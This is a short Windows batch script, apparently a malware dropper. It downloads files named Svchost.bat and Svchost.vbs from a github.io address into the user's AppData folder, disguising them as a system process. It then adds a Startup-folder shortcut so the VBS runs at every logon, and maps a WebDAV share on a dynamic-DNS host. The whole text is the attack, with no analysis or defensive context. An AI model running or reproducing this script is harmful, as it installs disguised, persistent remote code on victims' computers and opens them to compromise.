cd %userprofile%\AppData\Local
powershell wget https://delta-12.github.io/testing/files/Svchost.bat -outfile Svchost.bat
powershell wget https://delta-12.github.io/testing/files/Svchost.vbs -outfile Svchost.vbs
cd %userprofile%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('Svchost.lnk');$s.TargetPath='%userprofile%\AppData\Local\Svchost.vbs';$s.Save()"
net use B: \\jajaja.servehttp.com\webdav /persistent:no
net use B: /delete
